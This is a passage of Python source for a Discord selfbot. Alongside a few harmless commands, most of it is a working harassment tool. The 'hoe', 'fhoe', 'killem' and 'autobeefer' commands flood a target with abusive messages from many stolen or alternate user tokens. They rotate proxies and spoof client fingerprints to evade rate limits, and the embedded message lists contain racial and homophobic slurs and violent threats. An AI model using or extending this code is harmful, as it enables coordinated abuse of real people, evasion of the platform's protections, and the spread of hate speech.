        "Making plants grow faster 🌱"
    ]
    chosen_power = random.choice(powers + funny_powers)
    await ctx.send(f"Your superpower is: **{chosen_power}**! 💥")
    
from googletrans import Translator
@bot.command()
async def translate(ctx, text: str, target_language: str = 'en'):
    translator = Translator()
    translation = translator.translate(text, dest=target_language)
    await ctx.send(translation.text)
    
    
packs = load_packs()
auto_beef_tasks = {}
    
@bot.command()
async def autobeefer(ctx, user: discord.User, channel_id: int):
        await ctx.message.delete()
        
        channel = bot.get_channel(channel_id)
        if not channel:
            await ctx.send("Channel not found. Make sure the ID is correct.", delete_after=5)
            return
        
        if user.id in auto_beef_tasks:
            await ctx.send(f"AutoBeef is already running for {user.mention}.", delete_after=5)
            return
        
        if isinstance(channel, discord.TextChannel):
            log_action(f"Started AutoBeef for {user} in channel #{channel.name}.")
            channel_name = f"#{channel.name}"
        elif isinstance(channel, discord.DMChannel):
            log_action(f"Started AutoBeef for {user} in DM channel.")
            channel_name = "DM"
    
        async def auto_beef_loop():
            index = 0
            while True:
                if user.id not in auto_beef_tasks:
                    break
                
                message = packs[index] + f" {user.mention}"
                try:
                    await channel.send(message)
                except discord.errors.HTTPException as e:
                    if e.status == 429:
                        log_action(f"Rate limit encountered. Waiting for a few seconds before retrying.")
                        await asyncio.sleep(10)
                        continue
                    else:
                        log_action(f"Unexpected error occurred: {e}")
                        await asyncio.sleep(20)
    
                index = (index + 1) % len(packs)
                await asyncio.sleep(3)
    
        task = asyncio.create_task(auto_beef_loop())
        auto_beef_tasks[user.id] = task
    
        await ctx.send(f"AutoBeef started for {user.mention}.", delete_after=5)

   
@bot.command()
async def stopautobeefer(ctx, user: discord.User):
        await ctx.message.delete()
        
        if user.id not in auto_beef_tasks:
            await ctx.send(f"No active AutoBeef found for {user.mention}.", delete_after=5)
            return
        
        auto_beef_tasks[user.id].cancel()
        del auto_beef_tasks[user.id]
        
        log_action(f"Stopped AutoBeef for {user}.")
        await ctx.send(f"AutoBeef stopped for {user.mention}.", delete_after=5)
        
        
good_sign = f"{reset}[{green}+{reset}]"
bad_sign = f"{reset}[{red}-{reset}]"
mid_sign = f"{reset}[{yellow}/{reset}]"

def load_tokenss():
    with open("tokens4.txt", "r") as file:
        return [line.strip() for line in file if line.strip()]
    
tokenss = load_tokenss()   
gc_delay = 0
stop_eventText2 = asyncio.Event()
@bot.command()
async def gc1(ctx, *, names):
        global stop_eventText2
        stop_eventText2.clear()
    
        valid_tokens = tokenss[:]
        current_value = 1
        token_index = 0
    
        sentences = [s.strip() for s in names.split(",")]
    
        await ctx.message.delete()
        log_action(f"{good_sign} Executed gc command with names: {names}", ctx.channel)
    
        if not isinstance(ctx.channel, discord.GroupChannel):
            await ctx.send("This command can only be used in group chats.", delete_after=5)
            return
    
        async with aiohttp.ClientSession() as session:
            while not stop_eventText2.is_set() and valid_tokens:
                if token_index >= len(valid_tokens):
                    token_index = 0
    
                random_name = random.choice(sentences)
                new_name = f"{random_name} | {current_value}"
                current_token = valid_tokens[token_index]
                headers = {"Authorization": f"{current_token}"}
                json_data = {"name": new_name}
                url = f"https://discord.com/api/v10/channels/{ctx.channel.id}"
    
                try:
                    async with session.patch(url, json=json_data, headers=headers) as response:
                        if response.status == 200:
                            log_action(f"{good_sign} Group renamed to: {new_name} with token {token_index + 1}", ctx.channel)
                            current_value += 1
                        elif response.status == 403:
                            log_action(f"{bad_sign} Token {token_index + 1} does not have permission or is not in the server. Removing token.", ctx.channel)
                            valid_tokens.pop(token_index)
                            continue
                        elif response.status == 429:
                            log_action(f"{mid_sign} Rate Limited", ctx.channel)
                            await asyncio.sleep(15)
                        else:
                            log_action(f"{bad_sign} Failed: {response.status}", ctx.channel)
    
                except Exception as e:
                    log_action(f"{bad_sign} Error: {e}", ctx.channel)
    
                token_index = (token_index + 1) % len(valid_tokens)
                await asyncio.sleep(gc_delay)

@bot.command()
async def stopgc1(ctx):
        global stop_eventText2
        stop_eventText2.set()
        await ctx.message.delete()
        log_action(f"{good_sign} Executed stopgc command. Stopping renaming.", ctx.channel)
        await ctx.send("Renaming process has been stopped.", delete_after=5)




class AFK(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.afk_data = {}
        self.user_cooldowns = {}
        self.load_afk_data()  # Load AFK data when the bot starts

    def save_afk_data(self):
        with open("afk.json", "w") as f:
            json.dump(self.afk_data, f, indent=4)  # Ensure readable JSON format

    def load_afk_data(self):
        """Load AFK data from file, ensuring it's in the correct format."""
        try:
            with open("afk.json", "r") as f:
                data = json.load(f)
                # Ensure each entry is a dictionary, not a string
                self.afk_data = {
                    user_id: value if isinstance(value, dict) else {"reason": value, "time": int(time.time())}
                    for user_id, value in data.items()
                }
        except (FileNotFoundError, json.JSONDecodeError):
            self.afk_data = {}

    @commands.command()
    async def afk(self, ctx, *, reason="Busy so don't ping"):
        """Sets the user as AFK and stores the time"""
        user_id = str(ctx.author.id)
        afk_time = int(time.time())  # Store timestamp

        self.afk_data[user_id] = {
            "reason": reason,
            "time": afk_time
        }

        await ctx.send(f"-# {ctx.author.mention}, You are now AFK. Reason: {reason}")

        self.save_afk_data()

    @commands.command()
    async def unafk(self, ctx):
        """Removes AFK status"""
        user_id = str(ctx.author.id)
        if user_id in self.afk_data:
            del self.afk_data[user_id]
            await ctx.send(f"-# {ctx.author.mention}, You are no longer AFK")
            self.save_afk_data()
        else:
            await ctx.send(f"{ctx.author.mention}, -# You are not AFK")

    async def ignore_user_for_duration(self, user_id, duration):
        """Prevents repeated AFK messages to the same user"""
        self.user_cooldowns[user_id] = True
        await asyncio.sleep(duration)
        del self.user_cooldowns[user_id]

    @commands.Cog.listener()
    async def on_message(self, message):
        """Checks if an AFK user is mentioned and responds with AFK duration"""
        if message.author == self.bot.user:
            return

        if isinstance(message.channel, discord.DMChannel):
            return  

        for user_id, data in self.afk_data.items():
            if not isinstance(data, dict):  # Fixes any incorrect data type
                continue

            reason = data["reason"]
            afk_time = data["time"]
            elapsed_time = int(time.time()) - afk_time  # Calculate how long they've been AFK

            # Format the elapsed time
            minutes, seconds = divmod(elapsed_time, 60)
            hours, minutes = divmod(minutes, 60)
            elapsed_str = f"{hours}h {minutes}m {seconds}s" if hours else f"{minutes}m {seconds}s"

            if f"<@{user_id}>" in message.content:
                if message.author.id not in self.user_cooldowns:
                    await message.channel.send(f"-# {message.author.mention}, {reason} (AFK for {elapsed_str})")
                    await self.ignore_user_for_duration(message.author.id, 30)
                break
            elif message.reference and message.reference.cached_message:
                replied_to_user = message.reference.cached_message.author
                if str(replied_to_user.id) == user_id:
                    if message.author.id not in self.user_cooldowns:
                        await message.channel.send(f"-# {message.author.mention}, {reason} (AFK for {elapsed_str})")
                        await self.ignore_user_for_duration(message.author.id, 30)
bot.add_cog(AFK(bot))


from discord import Webhook, AsyncWebhookAdapter
from asyncio import timeout
gcspam_protection_enabled = False
autogc_enabled = False
autoleave_enabled = False 
autosleave_enabled = False
gc_config = {
    "enabled": False,
    "whitelist": [],
    "blacklist": [],
    "silent": True,
    "leave_message": "Goodbye.",
    "remove_blacklisted": True,
    "webhook_url": None,
    "auto_block": False
}

def save_gc_config():
    with open('gc_config.json', 'w') as f:
        json.dump(gc_config, f, indent=4)

def load_gc_config():
    try:
        with open('gc_config.json', 'r') as f:
            gc_config.update(json.load(f))
    except FileNotFoundError:
        save_gc_config()

load_gc_config()

@bot.group(invoke_without_command=True)
async def antigcspam(ctx):
    if ctx.invoked_subcommand is None:
        gc_config["enabled"] = not gc_config["enabled"]
        save_gc_config()
        
        status = f"""```ansi
{ansi_color}Anti GC-Spam Status{ansi_reset}
Enabled: {ansi_color}{gc_config["enabled"]}{ansi_reset}
Silent Mode: {ansi_color}{gc_config["silent"]}{ansi_reset}
Auto Remove Blacklisted: {ansi_color}{gc_config["remove_blacklisted"]}{ansi_reset}
Auto Block: {ansi_color}{gc_config["auto_block"]}{ansi_reset}
Whitelisted Users: {ansi_color}{len(gc_config["whitelist"])}{ansi_reset}
Blacklisted Users: {ansi_color}{len(gc_config["blacklist"])}{ansi_reset}
Webhook: {ansi_color}{"Set" if gc_config["webhook_url"] else "Not Set"}{ansi_reset} 
Leave Message: {ansi_color}{gc_config["leave_message"]}{ansi_reset}```"""
        await ctx.send(status)

@antigcspam.command(name="whitelist")
async def gc_whitelist(ctx, user: discord.User):
    if user.id not in gc_config["whitelist"]:
        gc_config["whitelist"].append(user.id)
        save_gc_config()
        await ctx.send(f"```{user.name} can now add you to group chats```")
    else:
        await ctx.send(f"```{user.name} is already allowed to add you to group chats```")

@antigcspam.command(name="unwhitelist")
async def gc_unwhitelist(ctx, user: discord.User):
    if user.id in gc_config["whitelist"]:
        gc_config["whitelist"].remove(user.id)
        save_gc_config()
        await ctx.send(f"```Removed {user.name} from whitelist```")
    else:
        await ctx.send(f"```{user.name} is not whitelisted```")

@antigcspam.command(name="blacklist")
async def gc_blacklist(ctx, user: discord.User):
    if user.id not in gc_config["blacklist"]:
        gc_config["blacklist"].append(user.id)
        save_gc_config()
        headers = {
            'Authorization': bot.http.token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI1MDgzNiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=',
            'X-Discord-Locale': 'en-US',
            'X-Debug-Options': 'bugReporterEnabled',
            'Origin': 'https://discord.com',
            'Referer': 'https://discord.com/channels/@me'
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.delete(
                    f'https://discord.com/api/v9/users/@me/relationships/{user.id}',
                    headers=headers
                ) as resp:
                    if resp.status == 204:
                        await ctx.send(f"```Added {user.name} to blacklist and removed friend```")
                        return
                        
        except Exception as e:
            print(f"Error removing friend: {e}")
            
        await ctx.send(f"```Added {user.name} to blacklist```")
    else:
        await ctx.send(f"```{user.name} is already blacklisted```")
@antigcspam.command(name="unblacklist")
async def gc_unblacklist(ctx, user: discord.User):
    if user.id in gc_config["blacklist"]:
        gc_config["blacklist"].remove(user.id)
        save_gc_config()
        await ctx.send(f"```Removed {user.name} from blacklist```")
    else:
        await ctx.send(f"```{user.name} is not blacklisted```")

@antigcspam.command(name="silent")
async def gc_silent(ctx, mode: bool):
    gc_config["silent"] = mode
    save_gc_config()
    await ctx.send(f"```Silent mode {'enabled' if mode else 'disabled'}```")

@antigcspam.command(name="message")
async def gc_message(ctx, *, message: str):
    gc_config["leave_message"] = message
    save_gc_config()
    await ctx.send(f"```Leave message set to: {message}```")

@antigcspam.command(name="autoremove")
async def gc_autoremove(ctx, mode: bool):
    gc_config["remove_blacklisted"] = mode
    save_gc_config()
    await ctx.send(f"```Auto-remove blacklisted users {'enabled' if mode else 'disabled'}```")

@antigcspam.command(name="webhook")
async def gc_webhook(ctx, url: str = None):
    gc_config["webhook_url"] = url
    save_gc_config()
    if url:
        await ctx.send("```Webhook URL set```")
    else:
        await ctx.send("```Webhook removed```")

@antigcspam.command(name="autoblock")
async def gc_autoblock(ctx, mode: bool):
    gc_config["auto_block"] = mode
    save_gc_config()
    await ctx.send(f"```Auto-block {'enabled' if mode else 'disabled'}```")

@antigcspam.command(name="list")
async def gc_list(ctx):
    whitelisted = "\n".join([f"• {bot.get_user(uid).name}" for uid in gc_config["whitelist"] if bot.get_user(uid)])
    blacklisted = "\n".join([f"• {bot.get_user(uid).name}" for uid in gc_config["blacklist"] if bot.get_user(uid)])
    
    status = f"""```ansi
Whitelisted Users:
{whitelisted if whitelisted else "None"}

Blacklisted Users:
{blacklisted if blacklisted else "None"}```"""
    await ctx.send(status)

@bot.event
async def on_private_channel_create(channel):
    if gc_config["enabled"] and isinstance(channel, discord.GroupChannel):
        try:
            await asyncio.sleep(0.5)
            
            headers = {
                'Authorization': bot.http.token,
                'Content-Type': 'application/json'
            }
            params = {
                'silent': str(gc_config["silent"]).lower()
            }

            try:
                async with timeout(2):  
                    async for msg in channel.history(limit=1):
                        creator = msg.author
                        
                        print(f"GC created by: {creator.name} ({creator.id})")

                        if creator.id in gc_config["whitelist"]:
                            print(f"Whitelisted user {creator.name}, allowing GC")
                            return
                            
                        if creator.id in gc_config["blacklist"]:
                            print(f"Blacklisted user {creator.name} detected")
                            
                            try:
                                async with aiohttp.ClientSession() as session:
                                    async with session.delete(
                                        f'https://discord.com/api/v9/users/@me/relationships/{creator.id}',
                                        headers=headers
                                    ) as resp:
                                        if resp.status == 204:
                                            print(f"Removed friend: {creator.name}")
                            except Exception as e:
                                print(f"Failed to remove friend: {e}")

                            if gc_config["remove_blacklisted"]:
                                try:
                                    async with aiohttp.ClientSession() as session:
                                        async with session.put(
                                            f'https://discord.com/api/v9/users/@me/relationships/{creator.id}',
                                            headers=headers,
                                            json={"type": 2}
                                        ) as resp:
                                            if resp.status == 204:
                                                print(f"Blocked user: {creator.name}")
                                except Exception as e:
                                    print(f"Failed to block user: {e}")
            except:
                print("Couldn't get creator info, leaving anyway")

            if not gc_config["silent"]:
                try:
                    await channel.send(gc_config["leave_message"])
                except:
                    print("Failed to send leave message")

            async with aiohttp.ClientSession() as session:
                for _ in range(3):  
                    try:
                        async with session.delete(
                            f'https://discord.com/api/v9/channels/{channel.id}',
                            headers=headers,
                            params=params
                        ) as resp:
                            if resp.status == 200:
                                print(f"Successfully left group chat: {channel.id}")
                                
                                if gc_config["webhook_url"]:
                                    try:
                                        creator_info = f"{creator.name}#{creator.discriminator} (ID: {creator.id})" if 'creator' in locals() else "Unknown"
                                        webhook_data = {
                                            "content": f"Left GC created by {creator_info}\nGC ID: {channel.id}"
                                        }
                                        await session.post(gc_config["webhook_url"], json=webhook_data)
                                    except:
                                        print("Failed to send webhook notification")
                                return
                                
                            elif resp.status == 429:
                                retry_after = int(resp.headers.get("Retry-After", 1))
                                print(f"Rate limited. Waiting {retry_after} seconds...")
                                await asyncio.sleep(retry_after)
                            else:
                                print(f"Failed to leave GC. Status: {resp.status}")
                                await asyncio.sleep(1)
                    except Exception as e:
                        print(f"Error during leave attempt: {e}")
                        await asyncio.sleep(1)

        except Exception as e:
            print(f"Error in GC protection: {e}")

    if not autogc_enabled:
        return

    try:
        async for msg in channel.history(limit=1):
            if msg.author.id in gc_config["whitelist"]:
                return
    except:
        pass

    tokens = loads_tokens()
    limited_tokens = tokens[:12]

    async def add_token_to_gc(token):
        try:
            user_client = discord.Client(intents=discord.Intents.default())
            
            @user_client.event
            async def on_ready():
                try:
                    await channel.add_recipients(user_client.user)
                    print(f'Added {user_client.user} to the group chat')
                except Exception as e:
                    print(f"Error adding user with token {token[-4:]}: {e}")
                finally:
                    await user_client.close()

            await user_client.start(token, bot=False)
            
        except Exception as e:
            print(f"Failed to process token {token[-4:]}: {e}")

    tasks = [add_token_to_gc(token) for token in limited_tokens if token != bot.http.token]
    await asyncio.gather(*tasks, return_exceptions=True)
    
    print(f"Attempted to add {len(limited_tokens)} tokens to group chat {channel.id}")



import logging


logging.basicConfig(level=logging.INFO)


fhoe = [
    "{mention}\n# you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name} you fucking suck {name}",
    "{mention}\n# your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch your my bitch",
    "{mention}\n# {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser {name} your a loser",
    "{mention}\n# {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you {name} i dont rate you"
]

fhoe_tasks = {}
running_fhoe = {}




jokestar = [
    "ill forever punch on you",
    "idk loser",
    "yo freak come meet your match and die",
    "wtf is a {user}"
    "wtf is a {user2}"
    "nigga is scared of his own voice",
    "this nigga got a openminded lisp",
    "yo bitch come lick my cum off your girl",
    "LOOOOOL COME GET YOUR HEAD CHOPPED OFF",
    "NIGGA YOU SUCK LETS BOX AGAIN",
    "yo your bf {user2} is dying LMAFOA",
    "nigga your shut out btw",
    "yo faggot idk you lets beef forever",
    "i dont gain rep from hoeing you {user}",
    "i dont gain rep from hoeing you {user2}",
    "you get killed in your own domain",
    "how you a nobody in your own domain",
    "i own this shitty com btw",
    "your clients suck LMFAO"
]

hoe_tasks = {}
running_hoe = {}

@bot.command()
async def hoe(ctx, user: discord.Member = None, name1: str = None, name2: str = None):
    if user is None or name1 is None:
        await ctx.send("```Usage: hoe @user name1 name2```")
        return
        
    if ctx.author.id in hoe_tasks:
        await ctx.send("```ay you already hoeing LMFAOO```")
        return

    valid_tasks = []
    running_hoe[ctx.author.id] = True

    async def hoe_task(token):
        headers = {
            'Authorization': token.strip(),
            'Content-Type': 'application/json'
        }

        while running_hoe.get(ctx.author.id, False):
            try:
                available_messages = [msg for msg in jokestar if not ('{user2}' in msg and name2 is None)]
                    
                message = random.choice(available_messages)
                message = message.replace("{user}", name1)
                if name2:
                    message = message.replace("{user2}", name2)
                message = f"{message} {user.mention}"

                proxy = await get_working_proxy() if proxy_enabled else None
                
                async with await create_proxy_session() as session:
                    async with session.post(
                        f'https://discord.com/api/v9/channels/{ctx.channel.id}/messages',
                        headers=headers,
                        json={'content': message},
                        proxy=proxy,
                        ssl=False
                    ) as resp:
                        if resp.status == 429:
                            print(f"Token {token[-4:]} hit rate limit, stopping all tokens")
                            running_hoe[ctx.author.id] = False
                            return
                        elif resp.status in [401, 403]:
                            print(f"Token {token[-4:]} is invalid, skipping")
                            return
                        elif resp.status not in [200, 201, 204]:
                            print(f"Error status {resp.status} for token {token[-4:]}")
                            await asyncio.sleep(2)
                            continue
                            
                await asyncio.sleep(random.uniform(0.225, 0.555))

            except Exception as e:
                print(f"Error in hoe task: {str(e)}")
                if not running_hoe.get(ctx.author.id, False):
                    break
                await asyncio.sleep(1)
                continue

    for token in tokenss:
        task = asyncio.create_task(hoe_task(token))
        valid_tasks.append(task)
    
    if valid_tasks:
        hoe_tasks[ctx.author.id] = valid_tasks
        await ctx.send(f"```Started hoeing {user.name} with {len(valid_tasks)} tokens```")
    else:
        await ctx.send("```No valid tokens found```")
        
        
@bot.command(name='hoemercy')
async def stop_hoe(ctx):
    if ctx.author.id in hoe_tasks:
        running_hoe[ctx.author.id] = False
        
        for task in hoe_tasks[ctx.author.id]:
            task.cancel()
        
        del hoe_tasks[ctx.author.id]
        if ctx.author.id in running_hoe:
            del running_hoe[ctx.author.id]
            
        await ctx.send("```Stopped hoeing```")
    else:
        await ctx.send("```No active hoe command```")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        if ctx.command.name == "hoe":
            await ctx.send("```Usage: xhoe @user name1 name2```")
        if ctx.comamand.name =="hoe":
            await ctx.send("```Usage: xhoe <@user> name1 name2```")


proxy_enabled = False
proxies = []
proxy_cycle = None


def load_proxies():
    global proxies, proxy_cycle
    try:
        with open('proxies.txt', 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        proxy_cycle = cycle(proxies)
        return True
    except Exception as e:
        print(f"Error loading proxies: {e}")
        return False


async def create_proxy_session():
    if proxy_enabled:
        connector = aiohttp.TCPConnector(ssl=False, force_close=True)
        return aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=30)
        )
    return aiohttp.ClientSession()

async def get_working_proxy():
    if not proxy_enabled:
        return None
        
    for _ in range(3):
        proxy = get_next_proxy()
        if proxy:
            proxy = format_proxy(proxy)
            async with aiohttp.ClientSession() as session:
                if await test_proxy(session, proxy):
                    return proxy
    return None

def get_next_proxy():
    if not proxy_cycle:
        return None
    proxy = next(proxy_cycle)
    return f"http://{proxy}"

async def test_proxy(session, proxy):
    try:
        async with session.get('https://discord.com', proxy=proxy, timeout=5) as resp:
            return resp.status == 200
    except:
        return False

def format_proxy(proxy):
    if not proxy.startswith(('http://', 'https://')):
        return f"http://{proxy}"
    return proxy


@bot.command()
async def fhoe(ctx, user: discord.Member = None, name: str = None):
    if user is None or name is None:
        await ctx.send("```Usage: fhoe @user name```")
        return
        
    if ctx.author.id in fhoe_tasks:
        await ctx.send("```your already hoeing LMFAO```")
        return

    valid_tasks = []
    running_fhoe[ctx.author.id] = True

    async def fhoe_task(token):
        headers = {
            'Authorization': token.strip(),
            'Content-Type': 'application/json'
        }

        while running_fhoe.get(ctx.author.id, False):
            try:
                message = random.choice(fhoe)
                message = message.replace("{mention}", user.mention)
                message = message.replace("{name}", name)

                proxy = await get_working_proxy() if proxy_enabled else None
                
                async with await create_proxy_session() as session:
                    async with session.post(
                        f'https://discord.com/api/v9/channels/{ctx.channel.id}/messages',
                        headers=headers,
                        json={'content': message},
                        proxy=proxy,
                        ssl=False
                    ) as resp:
                        if resp.status == 429:
                            retry_after = random.uniform(3, 5)
                            print(f"Rate limit hit for token {token[-4:]}, waiting {retry_after}s")
                            await asyncio.sleep(retry_after)
                            continue
                        elif resp.status in [401, 403]:
                            print(f"Token {token[-4:]} is invalid, skipping")
                            return
                        elif resp.status not in [200, 201, 204]:
                            print(f"Error status {resp.status} for token {token[-4:]}")
                            await asyncio.sleep(2)
                            continue
                            
                await asyncio.sleep(random.uniform(0.255, 0.555))

            except Exception as e:
                print(f"Error in fhoe task: {str(e)}")
                if not running_fhoe.get(ctx.author.id, False):
                    break
                await asyncio.sleep(1)
                continue
            
            

    for token in tokenss:
        task = asyncio.create_task(fhoe_task(token))
        valid_tasks.append(task)
    
    if valid_tasks:
        fhoe_tasks[ctx.author.id] = valid_tasks
        await ctx.send(f"```Started fhoeing {user.name} with {len(valid_tasks)} tokens```")
    else:
        await ctx.send("```No valid tokens found```")

@bot.command(name='fhoemercy')
async def stop_fhoe(ctx):
    if ctx.author.id in fhoe_tasks:
        running_fhoe[ctx.author.id] = False
        
        for task in fhoe_tasks[ctx.author.id]:
            task.cancel()
        
        del fhoe_tasks[ctx.author.id]
        if ctx.author.id in running_fhoe:
            del running_fhoe[ctx.author.id]
            
        await ctx.send("```Stopped fhoeing```")
    else:
        await ctx.send("```No active fhoe command```")


killmsg = [
    "yo slut you suck",
    "LMFAO LETS BEEF ALL DAY",
    "YO JR PICK THEM GLOVES UP LETS GO AGAIN",
    "lets beef forever",
    "getting bullied to an outsider lead you to get hoed by me",
    "aint shit a dream loser",
    "YO PEDO WAKE UP IM RIGHT HERE",
    "ILL BASH YOUR SKULL IN AND RIP OFF YOUR SKIN",
    "ILL TAKE YOUR HEAD AS MY TROPHY LOL",
    "yo deformed toilet paper come whipe my ass",
    "zip\nthat\nfucking\nlip\nfor\ni\npunch\nit\nin",
    "TIRED ALREADY LMFAO"
]

killmsg = [
    "yo slut you suck {name}",
    "LMFAO LETS BEEF ALL DAY",
    "YO JR PICK THEM GLOVES UP LETS GO AGAIN",
    "lets beef forever",
    "getting bullied to an outsider lead you to get hoed by me",
    "aint shit a dream loser",
    "YO PEDO WAKE UP IM RIGHT HERE",
    "ILL BASH YOUR SKULL IN AND RIP OFF YOUR SKIN",
    "ILL TAKE YOUR HEAD AS MY TROPHY LOL",
    "yo deformed toilet paper come whipe my ass",
    "zip\nthat\nfucking\nlip\nfor\ni\npunch\nit\nin",
    "TIRED ALREADY LMFAO"
]

kill_tasks = {}

@bot.command()
async def killem(ctx, user: discord.Member = None):
    if user is None:
        await ctx.send("```Usage: killem @user```")
        return
        
    if ctx.author.id in kill_tasks:
        await ctx.send("```Already running a kill command```")
        return

    valid_tasks = []
    should_stop = asyncio.Event()

    async def kill_task(token):
        headers = {
                        'Authorization': token.strip(),
                        'Content-Type': 'application/json'
                    }

        while not should_stop.is_set():
            try:
                message = random.choice(killmsg)
                message = f"{message} {user.mention}"

                async with aiohttp.ClientSession() as session:
                    async with session.post(
                        f'https://discord.com/api/v9/channels/{ctx.channel.id}/messages',
                        headers=headers,
                        json={'content': message}
                    ) as resp:
                        if resp.status == 429:
                            print(f"Token {token[-4:]} hit rate limit, stopping all tokens")
                            should_stop.set()
                            return
                        elif resp.status in [401, 403]:
                            print(f"Token {token[-4:]} is invalid, skipping")
                            return
                        elif resp.status != 200:
                            print(f"Error status {resp.status} for token {token[-4:]}")
                            await asyncio.sleep(2)
                            continue
                            
                    await asyncio.sleep(0.005)

            except Exception as e:
                print(f"Error in kill task: {str(e)}")
                await asyncio.sleep(2)
                continue

    for token in tokenss:
        task = asyncio.create_task(kill_task(token))
        valid_tasks.append(task)
    
    if valid_tasks:
        kill_tasks[ctx.author.id] = valid_tasks
        await ctx.send(f"```Started killing {user.name} with {len(valid_tasks)} tokens```")
    else:
        await ctx.send("```No valid tokens found```")

@bot.command(name='killstop')
async def stop_kill(ctx):
    if ctx.author.id in kill_tasks:
        for task in kill_tasks[ctx.author.id]:
            task.cancel()
        del kill_tasks[ctx.author.id]
        await ctx.send("```Stopped killing```")
    else:
        await ctx.send("```No active kill command```")
        
        


randomize_task = None
sesh = Session(client_identifier="chrome_115", random_tls_extension_order=True)


def change_profile_picture(image_path):
    headers = {
        "authority": "discord.com",
        "method": "PATCH",
        "scheme": "https",
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US",
        "authorization": bot.http.token,  
        "origin": "https://discord.com",
        "sec-ch-ua": '"Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9020 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "X-Debug-Options": "bugReporterEnabled",
        "X-Discord-Locale": "en-US",
        "X-Discord-Timezone": "Asia/Calcutta",
